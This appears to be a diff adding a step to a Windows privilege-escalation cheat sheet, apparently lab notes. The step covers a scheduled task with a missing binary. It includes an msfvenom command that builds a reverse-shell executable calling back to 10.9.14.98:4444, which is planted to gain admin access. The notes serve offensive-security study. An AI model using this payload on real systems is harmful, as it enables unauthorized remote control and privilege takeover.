@@ -129,8 +129,16 @@ HERE'S HOW I APPROACH FOR ESCALATING PRIVILEDGES:
         
  ![Windows_Priv_Esc_scheduled_task_missing_binary](https://user-images.githubusercontent.com/55708909/92596152-04b90400-f2c3-11ea-8f25-7d4b8ac8379b.png)
        
+        Program.exe is missing
         
+        msfvenom -p windows/shell_reverse_tcp LHOST=10.9.14.98 LPORT=4444 -f exe > program.exe
         
+        Put it in C:\Missing Schedule Binary and restart pc 
+        
+        You will have admin access
+
+![Schedule_task_missing_binary](https://user-images.githubusercontent.com/55708909/92596554-9cb6ed80-f2c3-11ea-9f13-c4a96b5ba764.png)
+
 
 11- Startup applications:
 --------------------------------------------------------------------------------------------
